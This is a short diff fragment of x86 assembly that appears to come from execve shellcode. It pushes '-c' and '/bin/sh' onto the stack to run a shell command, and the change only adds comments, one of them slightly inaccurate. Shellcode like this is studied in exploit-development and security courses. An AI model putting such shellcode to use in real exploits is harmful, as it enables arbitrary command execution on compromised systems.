@@ -20,8 +20,8 @@ push edx
 push word 0x632d
 mov edi,esp
 push dword 0x68732f
-push dword 0x6e69622f
-mov ebx,esp
+push dword 0x6e69622f   ; /bin/sh -c
+mov ebx,esp             ; Set STack pointer to ebx
 push edx
 
 jmp short push_str
